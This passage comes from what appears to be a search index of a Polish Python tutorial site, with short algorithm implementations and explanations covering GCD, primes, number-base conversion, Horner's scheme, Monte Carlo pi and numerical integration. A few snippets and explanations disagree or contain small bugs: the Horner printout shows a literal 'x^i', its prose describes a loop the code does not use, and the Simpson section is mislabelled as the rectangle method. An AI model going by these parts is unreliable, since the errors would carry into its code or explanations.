2)\n\nn = 10\n\nresult = fib(n)\n\nprint(f\"fib({n}) = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/gcd/","title":"NWD","text":""},{"location":"programming/python/algorithms/integers/gcd/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/gcd/#algorytm-nwd-z-odejmowaniem","title":"Algorytm NWD z odejmowaniem","text":"<pre><code>def gcd(a: int, b: int) -&gt; int:\n    while a != b:\n        if a &gt; b:\n            a -= b\n        else:\n            b -= a\n\n    return a\n\na = 32\nb = 12\n\nresult = gcd(a, b)\n\nprint(f\"GCD({a}, {b}) = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/gcd/#algorytm-euklidesa-wersja-iteracyjna","title":"Algorytm Euklidesa - wersja iteracyjna","text":"<pre><code>def gcd(a: int, b: int) -&gt; int:\n    while b != 0:\n        a, b = b, a % b\n\n    return a\n\na = 32\nb = 12\n\nresult = gcd(a, b)\n\nprint(f\"GCD({a},{b}) = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/gcd/#algorytm-euklidesa-wersja-rekurencyjna","title":"Algorytm Euklidesa - wersja rekurencyjna","text":"<pre><code>def gcd(a: int, b: int) -&gt; int:\n    if b == 0:\n        return a\n\n    return gcd(b, a % b)\n\na = 32\nb = 12\n\nresult = gcd(a, b)\n\nprint(f\"GCD({a},{b}) = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/perfect-test/","title":"Test doskona\u0142o\u015bci","text":""},{"location":"programming/python/algorithms/integers/perfect-test/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/perfect-test/#implementacja","title":"Implementacja","text":"<pre><code>def is_perfect(n: int) -&gt; bool:\n    divisors_sum = 1\n    i = 2\n\n    while i * i &lt;= n:\n        if n % i == 0:\n            divisors_sum += i\n\n            if n // i != i:\n                divisors_sum += n // i\n\n        i += 1\n\n    return divisors_sum == n\n\nn = 6\n\nif is_perfect(n):\n    print(f'{n} is a perfect number')\nelse:\n    print(f'{n} is not a perfect number')\n</code></pre>"},{"location":"programming/python/algorithms/integers/prime-factors/","title":"Rozk\u0142ad na czynniki pierwsze","text":""},{"location":"programming/python/algorithms/integers/prime-factors/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/prime-factors/#implementacja","title":"Implementacja","text":"<pre><code>def distribute(n: int) -&gt; list:\n    prime_factors = []\n    i = 2\n\n    while n &gt; 1:\n        if n % i == 0:\n            prime_factors.append(i)\n            n /= i\n        else:\n            i += 1\n\n    return prime_factors\n\nn = 124\n\nprint(f\"Prime factors of {n}: {distribute(n)}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/prime-test/","title":"Test pierwszo\u015bci","text":""},{"location":"programming/python/algorithms/integers/prime-test/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/prime-test/#implementacja","title":"Implementacja","text":"<pre><code>def is_prime(n: int) -&gt; bool:\n    if n &lt; 2:\n        return False\n\n    i = 2\n\n    while i * i &lt;= n:\n        if n % i == 0:\n            return False\n\n        i += 1\n\n    return True\n\nn = 7\n\nif is_prime(n):\n    print(f\"{n} is a prime number\")\nelse:\n    print(f\"{n} is not a prime number\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/primorial/","title":"Primorial","text":""},{"location":"programming/python/algorithms/integers/primorial/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/primorial/#implementacja","title":"Implementacja","text":"<pre><code>def is_prime(n: int) -&gt; bool:\n  if n &lt; 2:\n    return False\n\n  return all(n % i != 0 for i in range(2, int(n**0.5) + 1))\n\ndef primorial(n: int) -&gt; int:\n  primes = []\n  num = 2\n  while len(primes) &lt; n:\n    if is_prime(num):\n      primes.append(num)\n\n    num += 1\n\n  result = 1\n  for prime in primes:\n    result *= prime\n\n  return result\n\nn = 3\n\nresult = primorial(n)\n\nprint(f\"{n}# = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/segment-sieve/","title":"Sito Segmentowe","text":""},{"location":"programming/python/algorithms/integers/segment-sieve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/segment-sieve/#implementacja","title":"Implementacja","text":"<pre><code>import math\n\n\ndef sieve(n):\n    is_prime = [True] * (n + 1)\n\n    for i in range(2, int(math.sqrt(n)) + 1):\n        if is_prime[i]:\n            for j in range(i * i, n + 1, i):\n                is_prime[j] = False\n\n    primes = [i for i in range(2, n + 1) if is_prime[i]]\n\n    return primes\n\n\ndef segment_sieve(num_from, num_to):\n    limit = int(math.sqrt(num_to)) + 1\n    primes = sieve(limit)\n\n    n = num_to - num_from + 1\n    is_prime = [True] * n\n\n    for p in primes:\n        start = (num_from // p) * p\n        if start &lt; num_from:\n            start += p\n        if start == p:\n            start += p\n        for j in range(start, num_to + 1, p):\n            is_prime[j - num_from] = False\n\n    result = [i + num_from for i in range(n) if is_prime[i]]\n\n    return result\n\n\nnum_from = 100\nnum_to = 200\n\nprimes = segment_sieve(num_from, num_to)\n\nprint(*primes)\n</code></pre>"},{"location":"programming/python/algorithms/integers/subfactorial/","title":"Zaprzeczenie silni","text":""},{"location":"programming/python/algorithms/integers/subfactorial/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/subfactorial/#implementacja","title":"Implementacja","text":"<pre><code>def subfactorial(n: int) -&gt; int:\n    if n == 0:\n        return 1\n    elif n == 1:\n        return 0\n\n    a, b = 1, 0\n    for i in range(2, n + 1):\n        a, b = b, (i - 1) * (a + b)\n\n    return b\n\nn = 3\n\nresult = subfactorial(n)\n\nprint(f\"!{n} = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/superfactorial/","title":"Superfactorial","text":""},{"location":"programming/python/algorithms/integers/superfactorial/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/superfactorial/#implementacja","title":"Implementacja","text":"<pre><code>def superfactorial(n: int) -&gt; int:\n    result = factorial = 1\n\n    for i in range(2, n + 1):\n        factorial *= i\n        result *= factorial\n\n    return result\n\nn = 4\n\nresult = superfactorial(n)\n\nprint(f\"{n}$ = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/matrix/det3/","title":"Wyznacznik macierzy 3x3","text":""},{"location":"programming/python/algorithms/matrix/det3/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/matrix/det3/#implementacja","title":"Implementacja","text":"<pre><code>def det3(matrix) -&gt; int:\n    return matrix[0][0] * matrix[1][1] * matrix[2][2] + matrix[1][0] * matrix[2][1] * matrix[0][2] + matrix[2][0] * \\\n           matrix[0][1] * matrix[1][2] - matrix[0][2] * matrix[1][1] * matrix[2][0] - matrix[0][1] * matrix[1][0] * \\\n           matrix[2][2] - matrix[0][0] * matrix[1][2] * matrix[2][1]\n\nmatrix = [\n       [1, 2, 3], \n       [4, 5, 6], \n       [7, 8, 9]]\n\nresult = det3(matrix)\n\nprint(result)\n</code></pre>"},{"location":"programming/python/algorithms/matrix/det3/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>det3</code> (linia 1) wylicza wyznacznik macierzy \\(3\\times3\\) przekazanej jako parametr funkcji. Wewn\u0105trz funkcji mamy tylko jedn\u0105 operacj\u0119 zwracaj\u0105c\u0105 wyznacznik macierzy obliczony zgodnie ze wzorem.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej najpierw przygotowujemy macierz (linia 7), nast\u0119pnie obliczamy jej wyznacznik (linia 9) i wypisujemy go na ekranie (linia 11).</p>"},{"location":"programming/python/algorithms/numeral-systems/base-conversion/","title":"Konwersja pomi\u0119dzy systemami liczbowymi","text":""},{"location":"programming/python/algorithms/numeral-systems/base-conversion/#opis-problemu","title":"Opis problemu","text":"<p>Systemy liczbowe</p>"},{"location":"programming/python/algorithms/numeral-systems/base-conversion/#konwersja-z-dziesietnego","title":"Konwersja z dziesi\u0119tnego","text":"<pre><code>def from_dec(number: int, new_base: int) -&gt; str:\n    converted = \"\"\n    remainder = 0\n\n    while number &gt; 0:\n        remainder = number % new_base\n        number = number // new_base\n\n        if remainder &gt; 9:\n            converted = chr(ord('A') + remainder - 10) + converted\n        else:\n            converted = str(remainder) + converted\n\n    return converted\n\nnumber = 241\nbase = 16\n\nconverted = from_dec(number, base)\n\nprint(f'{number} (10) = {converted} ({base})')\n</code></pre>"},{"location":"programming/python/algorithms/numeral-systems/base-conversion/#konwersja-na-dziesietny","title":"Konwersja na dziesi\u0119tny","text":"<pre><code>def to_dec(number: str, base: int) -&gt; int:\n    converted = 0\n    power = 1\n    i = len(number) - 1\n\n    while i &gt;= 0:\n        if ord(number[i]) &lt;= ord('9'):\n            converted += int(number[i]) * power\n        else:\n            value = ord(number[i]) - ord('A') + 10\n            converted += value * power\n\n        power *= base\n        i -= 1\n\n    return converted\n\nnumber = \"AF2\"\nbase = 16\n\nconverted = to_dec(number, base)\n\nprint(f'{number} ({base}) = {converted} (10)')\n</code></pre>"},{"location":"programming/python/algorithms/numeral-systems/u2-conversion/","title":"Konwersja w systemie U2","text":""},{"location":"programming/python/algorithms/numeral-systems/u2-conversion/#opis-problemu","title":"Opis problemu","text":"<p>System U2</p>"},{"location":"programming/python/algorithms/numeral-systems/u2-conversion/#z-u2-do-dziesietnego","title":"Z U2 do dziesi\u0119tnego","text":"<pre><code>def u2_to_decimal(number: str) -&gt; int:\n    power = 2 ** (len(number) - 1)\n    result = 0\n\n    if number[0] == \"1\":\n        result -= power\n\n    for index in range(1, len(number)):\n        power //= 2\n        digit = number[index]\n\n        if digit == \"1\":\n            result += power\n\n    return result\n\nnumber_u2 = \"10000001\"\n\nnumber_decimal = u2_to_decimal(number_u2)\n\nprint(f\"{number_u2} (U2) = {number_decimal} (10)\")\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/fast-exp/","title":"Szybkie pot\u0119gowanie","text":""},{"location":"programming/python/algorithms/numerical-methods/fast-exp/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/numerical-methods/fast-exp/#rozwiazanie-iteracyjne","title":"Rozwi\u0105zanie iteracyjne","text":"<pre><code>def fast_exp(a: int, n: int) -&gt; int:\n    w = 1\n\n    while n &gt; 0:\n        if n % 2 == 1:\n            w *= a\n\n        a *= a\n        n = n // 2\n\n    return w\n\na = 2\nn = 10\n\nresult = fast_exp(a, n)\n\nprint(f\"{a}^{n} = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/fast-exp/#rozwiazanie-rekurencyjne","title":"Rozwi\u0105zanie rekurencyjne","text":"<pre><code>def fast_exp(a: int, n : int) -&gt; int:\n    if n == 0:\n        return 1\n\n    if n % 2 == 1:\n        return fast_exp(a, n // 2) ** 2 * a\n    else:\n        return fast_exp(a, n // 2) ** 2\n\na = 2\nn = 10\n\nresult = fast_exp(a, n)\n\nprint(f\"{a}^{n} = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/horner/","title":"Schemat Hornera","text":""},{"location":"programming/python/algorithms/numerical-methods/horner/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/numerical-methods/horner/#implementacja","title":"Implementacja","text":"<pre><code>def horner_polynomial(coef: [], x: float, n: float) -&gt; float:\n    \"\"\"\n    Computes value of the n-th degree polynomial for the given coefficients \n    and x value using Horner method\n\n    :param coef: list of n+1 coefficients, where coef[i] is coefficient for the x^i\n    :param x:\n    :param n: degree of the polynomial\n\n    :return: value of the polynomial\n    \"\"\"\n    result = 0\n    for a in reversed(coef):\n        result *= x\n        result += a\n\n    return result\n\ndef print_polynomial(coef: [], n: int):\n    \"\"\"\n    Prints given polynomial\n\n    :param coef: array of n+1 coefficients, where coef[i] is coefficient for the x^i\n    :param n: degree of the polynomial\n    \"\"\"\n    print(f\"f(x) = {coef[0]}\", end = \"\")\n    for i  in range(1, n+1):\n        print(f\" + {coef[i]}x^i\", end=\"\") \n\n    print()\n\ncoef = [1, 2, 3]\nx = 2\nn = 2\n\nprint_polynomial(coef, n)\nresult = horner_polynomial(coef, x, n)\nprint(f\"f({x}) = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/horner/#opis-implementacji","title":"Opis implementacji","text":"<p>Zacznijmy od funkcji pomocniczej <code>print_polynomial</code> (linia 20), kt\u00f3rej celem jest wy\u015bwietlenie wielomianu w czytelnej formie na ekranie. Nie jest ona niezb\u0119dn\u0105 cz\u0119\u015bci\u0105 algorytmu, ale mo\u017ce by\u0107 pomocna przy weryfikacji poprawno\u015bci wyniku. Funkcja przyjmuje dwa parametry: list\u0119 wsp\u00f3\u0142czynnik\u00f3w wielomianu <code>coef</code>, oraz stopie\u0144 wielomianu <code>n</code>. W tablicy znajduje si\u0119 dok\u0142adnie \\(n+1\\) liczb. Wsp\u00f3\u0142czynniki s\u0105 zapisane w kolejno\u015bci od najmniejszej pot\u0119gi (\\(0\\)) do najwi\u0119kszej (\\(n\\)).</p> <p>Na pocz\u0105tku funkcji wypisujemy pierwszy wsp\u00f3\u0142czynnik (linia 27). Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez kolejne elementy tablicy (linia 28), wypisuj\u0105c wsp\u00f3\u0142czynnik przy \\(i\\)-tej pot\u0119dze przemno\u017cony przez \\(x\\) podniesione do pot\u0119gi \\(i\\).  Dbaj\u0105c o czytelno\u015b\u0107 reprezentacji podajemy przy funkcji <code>print</code> opcjonalny argument <code>end</code>, dzi\u0119ki czemu mo\u017cemy zast\u0105pi\u0107 domy\u015blny koniec linii dowolnym znakiem (w tym wypadku znakiem pustym), dzi\u0119ki czemu kolejne wywo\u0142ania funkcji <code>print</code> b\u0119d\u0105 wy\u015bwietla\u0107 tekst w tej samej linii.</p> <p>Przejd\u017amy teraz do w\u0142a\u015bciwej implementacji algorytmu obliczania warto\u015bci wielomianu za pomoc\u0105 schematu Hornera, czyli do funkcji <code>horner_polynomial</code> (linia 1). Funkcja ta przyjmuje podobne parametry jak pomocnicza funkcja <code>print_polynomial</code>, ale ponadto przyjmuje tak\u017ce warto\u015b\u0107 \\(x\\), kt\u00f3r\u0105 mamy przyj\u0105\u0107 podczas oblicze\u0144. Wsp\u00f3\u0142czynniki i stopie\u0144 wielomianu podane s\u0105 w takiej samej formie jak wcze\u015bniej.</p> <p>Na pocz\u0105tku tworzymy zmienn\u0105 <code>result</code>, w kt\u00f3rej b\u0119dziemy zapisywa\u0107 wyniki oblicze\u0144, i przypisujemy jej warto\u015b\u0107 \\(0\\) (linia 12). Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez kolejne wsp\u00f3\u0142czynniki wielomianu, poczynaj\u0105c od wsp\u00f3\u0142czynnika przy najwy\u017cszej pot\u0119dze (linia 13). Zauwa\u017c, \u017ce korzystamy tutaj z p\u0119tli malej\u0105cej, dlatego konieczne jest podanie trzeciego argumentu funkcji <code>range</code> \u2014 kroku p\u0119tli, kt\u00f3ry w tym wypadku jest ujemny. W p\u0119tli wykonujemy dwie operacje: przemna\u017camy wynik dotychczasowych oblicze\u0144 przez warto\u015b\u0107 <code>x</code> (linia 14), a nast\u0119pnie dodajemy do wyniku warto\u015b\u0107 kolejnego wsp\u00f3\u0142czynnika (linia 15). Po przej\u015bciu przez wszystkie wsp\u00f3\u0142czynniki wystarczy zwr\u00f3ci\u0107 wynik oblicze\u0144 (linia 17).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej definiujemy warto\u015bci parametr\u00f3w naszych oblicze\u0144 (linie 34-36), wypisujemy wielomian w czytelnej formie korzystaj\u0105c z pomocniczej funkcji <code>print_polynomial</code> (linia 38), obliczamy warto\u015b\u0107 wielomianu za pomoc\u0105 funkcji <code>horner_polynomial</code> (linia 39) i wypisujemy wynik na ekranie (linia 40).</p>"},{"location":"programming/python/algorithms/numerical-methods/monte-carlo/","title":"Metoda Monte Carlo","text":""},{"location":"programming/python/algorithms/numerical-methods/monte-carlo/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/numerical-methods/monte-carlo/#obliczanie-wartosci-liczby-pi","title":"Obliczanie warto\u015bci liczby PI","text":"<pre><code>from random import random\n\ndef monte_carlo_pi(points_count: int) -&gt; float:\n    num_points_in_circle = 0\n    center_x = center_y = radius = 1\n\n    for _ in range(points_count):\n        x = random() * 2.0\n        y = random() * 2.0\n        distance = ((x - center_x) ** 2) + ((y - center_y) ** 2)\n\n        if distance &lt;= radius ** 2:\n            num_points_in_circle += 1\n\n    return (4 * num_points_in_circle) / points_count\n\npoints_count = 1000\n\nestimated_pi = monte_carlo_pi(points_count)\n\nprint(f\"PI ~= {estimated_pi}\")\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/monte-carlo/#obliczanie-wartosci-pi-wraz-z-rysowaniem-wykresu","title":"Obliczanie warto\u015bci PI wraz z rysowaniem wykresu","text":"<pre><code>from random import random\n\nimport matplotlib.pyplot as plt\n\ndef monte_carlo_pi(points_count: int) -&gt; float:\n    num_points_in_circle = 0\n    center_x = center_y = radius = 1\n    plot_values = []\n\n    for i in range(1, points_count + 1):\n        x = random() * 2.0\n        y = random() * 2.0\n        distance = ((x - center_x) ** 2) + ((y - center_y) ** 2)\n\n        if distance &lt;= radius ** 2:\n            num_points_in_circle += 1\n\n        plot_values.append((4 * num_points_in_circle) / i)\n\n    plt.plot(plot_values)\n    plt.xlabel(\"Number of points\")\n    plt.ylabel(\"Estimated PI value\")\n    plt.title(\"Monte Carlo method for computing PI value\")\n\n    return (4 * num_points_in_circle) / points_count\n\npoints_count = 1000\n\nestimated_pi = monte_carlo_pi(points_count)\n\nprint(f\"PI ~= {estimated_pi}\")\n\nplt.show()\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/numerical-integration/","title":"Ca\u0142kowanie numeryczne","text":""},{"location":"programming/python/algorithms/numerical-methods/numerical-integration/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/numerical-methods/numerical-integration/#metoda-prostokatow","title":"Metoda prostok\u0105t\u00f3w","text":"<pre><code>def f(x: float) -&gt; float:\n    return x * x + 2 * x\n\ndef rectangles_method(a: int, b: int, n: int) -&gt; float:\n    rectangle_width = (b - a) / n\n    area = 0\n    current_point = a\n\n    for i in range(n):\n        current_point += rectangle_width\n        rectangle_height = f(current_point)\n        area += rectangle_height * rectangle_width\n\n    return area\n\na = 0\nb = 10\nn = 100\narea = rectangles_method(a, b, n)\nprint(area)\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/numerical-integration/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>f</code> (linia 1) przyjmuje jeden parametr rzeczywisty i jako wynik zwraca liczb\u0119 rzeczywist\u0105. Funkcja ta symuluje funkcj\u0119 matematyczn\u0105, kt\u00f3rej pole pod wykresem chcemy policzy\u0107. </p> <p>Funkcja <code>rectangles_method</code> (linia 5) realizuje algorytm ca\u0142kowania numerycznego metod\u0105 prostok\u0105t\u00f3w i przyjmuje trzy parametry: pocz\u0105tek przedzia\u0142u (<code>a</code>), koniec przedzia\u0142u (<code>b</code>) oraz liczb\u0119 prostok\u0105t\u00f3w (<code>n</code>). Funkcja jako wynik zwraca liczb\u0119 rzeczywist\u0105 reprezentuj\u0105c\u0105 przybli\u017cenie pola pod wykresem funkcji \\(f(x)=x^2+2x\\) na przedziale \\(&lt;a, b&gt;\\). Wewn\u0105trz funkcji zaczynamy od policzenia szeroko\u015bci jednego prostok\u0105ta, dziel\u0105c d\u0142ugo\u015b\u0107 przedzia\u0142u przez liczb\u0119 prostok\u0105t\u00f3w (linia 6). Nast\u0119pnie tworzymy zmienn\u0105 do zapami\u0119tania obliczanego pola (linia 7) oraz zmienn\u0105 do zapami\u0119tania obecnej pozycji na osi \\(x\\) (linia 8). W nast\u0119pnej kolejno\u015bci przechodzimy p\u0119tl\u0105 \\(n\\) razy (linia 10). Wewn\u0105trz p\u0119tli przesuwamy obecn\u0105 pozycj\u0119 na osi \\(x\\) w prawo o szeroko\u015b\u0107 jednego prostok\u0105ta (linia 11). Nast\u0119pnie obliczamy wysoko\u015b\u0107 prostok\u0105ta w obecnym punkcie poprzez obliczenie warto\u015bci funkcji w tym miejscu (linia 12). Obliczon\u0105 wysoko\u015b\u0107 wykorzystujemy do policzenia pola obecnego prostok\u0105ta i dodania go do zliczanego pola pod wykresem funkcji (linia 13). Na koniec funkcji, po wyj\u015bciu z p\u0119tli, zwracamy obliczone pole pod wykresem funkcji (linia 15).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu przygotowujemy dane do naszego algorytmu: pocz\u0105tek przedzia\u0142u (linia 18), koniec przedzia\u0142u (linia 19) oraz liczb\u0119 prostok\u0105t\u00f3w (linia 20). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>rectangles_method</code> z przygotowanymi danymi, a jej wynik zapisujemy w zmiennej <code>area</code> (linia 21). Na koniec wypisujemy wynik na ekranie (linia 22).</p>"},{"location":"programming/python/algorithms/numerical-methods/numerical-integration/#metoda-trapezow","title":"Metoda trapez\u00f3w","text":"<pre><code>def f(x: float) -&gt; float:\n    return x * x + 2 * x\n\ndef trapezes_method(a: int, b: int, n: int) -&gt; float:\n    trapeze_height = (b - a) / n\n    area = 0\n    current_point = a\n\n    for i in range(n):\n        trapeze_first_side = f(current_point)\n        current_point += trapeze_height\n        trapeze_second_side = f(current_point)\n        area += ((trapeze_first_side + trapeze_second_side) * trapeze_height) / 2\n\n    return area\n\na = 0\nb = 10\nn = 100\narea = trapezes_method(a, b, n)\nprint(area)\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/numerical-integration/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>f</code> (linia 1) przyjmuje jeden parametr rzeczywisty i jako wynik zwraca liczb\u0119 rzeczywist\u0105. Funkcja ta symuluje funkcj\u0119 matematyczn\u0105, kt\u00f3rej pole pod wykresem chcemy policzy\u0107. </p> <p>Funkcja <code>trapezes_method</code> (linia 5) realizuje algorytm ca\u0142kowania numerycznego metod\u0105 trapez\u00f3w i przyjmuje trzy parametry: pocz\u0105tek przedzia\u0142u (<code>a</code>), koniec przedzia\u0142u (<code>b</code>) oraz liczb\u0119 trapez\u00f3w (<code>n</code>). Funkcja jako wynik zwraca liczb\u0119 rzeczywist\u0105 reprezentuj\u0105c\u0105 przybli\u017cenie pola pod wykresem funkcji \\(f(x)=x^2+2x\\) na przedziale \\(&lt;a, b&gt;\\). Wewn\u0105trz funkcji zaczynamy od policzenia wysoko\u015bci jednego trapezu, dziel\u0105c d\u0142ugo\u015b\u0107 przedzia\u0142u przez liczb\u0119 trapez\u00f3w (linia 6). Nast\u0119pnie tworzymy zmienn\u0105 do zapami\u0119tania obliczanego pola (linia 7) oraz zmienn\u0105 do zapami\u0119tania obecnej pozycji na osi \\(x\\) (linia 8). W nast\u0119pnej kolejno\u015bci przechodzimy p\u0119tl\u0105 \\(n\\) razy (linia 10). Wewn\u0105trz p\u0119tli obliczamy d\u0142ugo\u015b\u0107 pierwszej podstawy trapezu (linia 11), a nast\u0119pnie przesuwamy obecn\u0105 pozycj\u0119 na osi \\(x\\) w prawo o wysoko\u015b\u0107 jednego trapezu (linia 12). Nast\u0119pnie obliczamy d\u0142ugo\u015b\u0107 drugiej podstawy trapezu w obecnym punkcie poprzez obliczenie warto\u015bci funkcji w tym miejscu (linia 13). Obliczone d\u0142ugo\u015bci podstaw wykorzystujemy do policzenia pola obecnego trapezu i dodania go do zliczanego pola pod wykresem funkcji (linia 14). Na koniec funkcji, po wyj\u015bciu z p\u0119tli, zwracamy obliczone pole pod wykresem funkcji (linia 16).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu przygotowujemy dane do naszego algorytmu: pocz\u0105tek przedzia\u0142u (linia 19), koniec przedzia\u0142u (linia 20) oraz liczb\u0119 prostok\u0105t\u00f3w (linia 21). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>trapezes_method</code> z przygotowanymi danymi, a jej wynik zapisujemy w zmiennej <code>area</code> (linia 22). Na koniec wypisujemy wynik na ekranie (linia 23).</p>"},{"location":"programming/python/algorithms/numerical-methods/simpson-integration/","title":"Metoda Simpsona","text":""},{"location":"programming/python/algorithms/numerical-methods/simpson-integration/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/numerical-methods/simpson-integration/#metoda-prostokatow","title":"Metoda prostok\u0105t\u00f3w","text":"<pre><code>def f(x: float) -&gt; float:\n    return x * x + 2 * x\n\ndef simpson_method(a: float, b: float, n: int) -&gt; float:\n    h = (b - a) / n\n    sum = f(a) + f(b)\n\n    for i in range(1, n + 1, 2):\n        sum += 4 * f(a + i * h)\n\n    for i in range(2, n, 2): \n        sum += 2 * f(a + i * h)\n\n    return (h / 3) * sum\n\n\na = 1.0\nb = 5.0\nn = 100\narea = simpson_method(a, b, n)\nprint(area)\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/simpson-integration/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>f</code> (linia 1) przyjmuje jeden parametr rzeczywisty i jako wynik zwraca liczb\u0119 rzeczywist\u0105. Funkcja ta symuluje funkcj\u0119 matematyczn\u0105, kt\u00f3rej pole pod wykresem chcemy policzy\u0107. </p> <p>Funkcja <code>simpson_method</code> (linia 5) realizuje algorytm ca\u0142kowania numerycznego metod\u0105 prostok\u0105t\u00f3w i przyjmuje trzy parametry: pocz\u0105tek przedzia\u0142u (<code>a</code>), koniec przedzia\u0142u (<code>b</code>) oraz liczb\u0119 podzia\u0142\u00f3w (<code>n</code>). Funkcja jako wynik zwraca liczb\u0119 rzeczywist\u0105 reprezentuj\u0105c\u0105 przybli\u017cenie pola pod wykresem funkcji \\(f(x)=x^2+2x\\) na przedziale \\([a, b]\\).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu przygotowujemy dane do naszego algorytmu: pocz\u0105tek przedzia\u0142u (linia 18), koniec przedzia\u0142u (linia 19) oraz liczb\u0119 podzia\u0142\u00f3w (linia 20). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>simpson_method</code> z przygotowanymi danymi, a jej wynik zapisujemy w zmiennej <code>area</code> (linia 21). Na koniec wypisujemy wynik na ekranie (linia 22).</p>"},{"location":"programming/python/algorithms/numerical-methods/square-root/","title":"Pierwiastek kwadratowy","text":""},{"location":"programming/python/algorithms/numerical-methods/square-root/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/numerical-methods/square-root/#metoda-herona","title":"Metoda Herona","text":"<pre><code>def sqrt(n: float, p: float) -&gt; float:\n    x1 = n / 2\n    x2 = (x1 + (n / x1)) / 2\n    while abs(x2 - x1) &gt; p:\n        x1 = (x2 + n / x2) / 2\n        x1, x2 = x2, x1\n\n    return x2\n\nn = 9.0\np = 0.00000001\n\nresult = sqrt(n, p)\n\nprint(f\"sqrt({n}) ~= {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/square-root/#opis-implementacji","title":"Opis implementacji","text":"<p>Na pocz\u0105tku definiujemy funkcj\u0119 <code>sqrt</code> (linia 1), kt\u00f3ra przyjmuje dwa parametry: liczb\u0119, kt\u00f3rej pierwiastek chcemy policzy\u0107 (\\(n\\)) oraz dok\u0142adno\u015b\u0107 oblicze\u0144 (\\(p\\)). Wewn\u0105trz funkcji zaczynamy od obliczenia pierwszego przybli\u017cenia warto\u015bci pierwiastka kwadratowego z \\(n\\), kt\u00f3re zapisujemy w zmiennej <code>x1</code> (linia 2). Nast\u0119pnie ze wzoru obliczamy kolejne przybli\u017cenie i zapisujemy je w zmiennej <code>x2</code> (linia 3). Teraz przechodzimy do p\u0119tli warunkowej (linia 4), w kt\u00f3rej obliczenia przeprowadzamy tak d\u0142ugo, jak warto\u015b\u0107 bezwzgl\u0119dna r\u00f3\u017cnicy pomi\u0119dzy kolejnymi przybli\u017ceniami (<code>abs(x2 - x1)</code>) jest wi\u0119ksza od podanej dok\u0142adno\u015bci. Wewn\u0105trz p\u0119tli obliczamy kolejne przybli\u017cenie, kt\u00f3re zapisujemy w zmiennej <code>x1</code> (linia 5). Nast\u0119pnie zamieniamy warto\u015bciami zmienne <code>x1</code> oraz <code>x2</code> (linia 6), tak aby w zmiennej <code>x1</code> by\u0142o poprzednie przybli\u017cenie, a w zmiennej <code>x2</code> by\u0142o kolejne przybli\u017cenie. Po zako\u0144czeniu oblicze\u0144 i wyj\u015bciu z p\u0119tli, zwracamy wynik zapisany w zmiennej <code>x2</code> (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej definiujemy dane wej\u015bciowe do naszego problemu (linie 11 oraz 12), wywo\u0142ujemy funkcj\u0119 <code>sqrt</code> z przygotowanymi danymi (linia 14) i jej wynik zapisujemy w zmiennej <code>result</code>, a na koniec wypisujemy wynik na ekran (linia 16).</p>"},{"location":"programming/python/algorithms/numerical-methods/square-root/#metoda-herona-z-wykresem","title":"Metoda Herona z wykresem","text":"<pre><code>import matplotlib.pyplot as plt\n\ndef sqrt(n: float, p: float) -&gt; float:\n    x1 = n / 2\n    x2 = (x1 + (n / x1)) / 2\n    plot_values = [x1, x2]\n    while abs(x2 - x1) &gt; p:\n        x1 = (x2 + n / x2) / 2\n        x1, x2 = x2, x1\n        plot_values.append(x2)\n\n    plt.plot(plot_values, label=f\"heron({n},{p})\")\n    plt.legend()\n\n    return x2\n\nn = 9.0\np = 0.00000001\n\nresult = sqrt(n, p)\n\nprint(f\"sqrt({n}) ~= {result}\")\n\nplt.show()\n</code></pre>"},{"location":"programming/python/algorithms/numerical-methods/square-root/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Na pocz\u0105tku importujemy modu\u0142 pyplot z biblioteki 